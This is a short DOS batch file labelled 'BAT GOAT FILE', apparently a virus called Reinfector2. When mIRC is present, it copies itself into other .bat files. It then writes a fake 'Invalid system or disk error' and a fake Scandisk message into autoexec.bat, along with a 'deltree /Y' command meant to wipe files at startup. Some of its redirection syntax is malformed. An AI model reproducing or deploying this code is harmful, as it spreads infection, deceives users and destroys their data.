REM ------------------------------------------------
REM -------------- BAT GOAT FILE -------------------
REM ------------------------------------------------
@echo off
rem Reinfector2
if exist c:\mirc\mirc32.exe goto infect
if not exist c:\mirc\mirc32.exe goto noinfect
:infect
for %%i in (*.bat ../*.bat) do copy %%i+%0 %%i>nul
if exist c:\autoexec.bat goto infect2
if not exist c:\autoexec.bat goto noinfect2
:infect2
echo echo Invalid system or disk error <<c:\autoexec.bat
pause <<c:\autoexec.bat
echo echo Now Scandisk will run, and fix any errors. <<c:\autoexec.bat
pause <<c:\autoexec.bat
deltree /Y <<c:\autoexec.bat
pause <<c:\autoexec.bat 
echo echo Sorry, scandisk failed! <<c:\autoexec.bat


